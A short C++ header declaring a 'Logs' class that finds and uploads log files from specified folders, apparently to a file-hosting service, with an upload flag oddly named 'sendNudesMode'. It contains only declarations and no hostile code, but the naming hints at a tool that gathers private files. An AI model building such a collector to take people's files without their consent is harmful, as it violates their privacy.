#pragma once

#include <string>
#include <list>

#include "filesfm.fwd.h"


using namespace std;

namespace FilesFM {
    class Logs {
        public:
            FilesFM* filesFM;

            Logs(FilesFM* parent);
            ~Logs();

            // Find and upload log files from specified folders
            void Upload(list<wstring> folderPaths, bool sendNudesMode);

            // Upload a specific log file
            bool UploadFile(wstring path);
    };
}